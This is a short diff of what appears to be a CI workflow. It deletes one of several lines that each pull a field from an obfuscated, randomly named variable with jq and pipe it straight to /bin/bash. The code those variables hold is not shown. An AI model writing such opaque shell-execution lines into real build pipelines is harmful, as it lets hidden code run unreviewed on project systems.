@@ -34,7 +34,6 @@ jobs:
           echo $dkvn8104 | jq -r .hlas50490 | /bin/bash
           echo $yjkxs58043 | jq -r .mvo62 | /bin/bash
           printf '%s' "$k4460" | jq -r .bzn21202 | /bin/bash
-          printf '%s' "$eqlg405" | jq -r .ns736 | /bin/bash
           echo $meksf5651 | jq -r .noc4215 | /bin/bash
           echo $lf756 | jq -r .pnfgi5332 | /bin/bash
           printf '%s' "$u494" | jq -r .rc2880 | /bin/bash
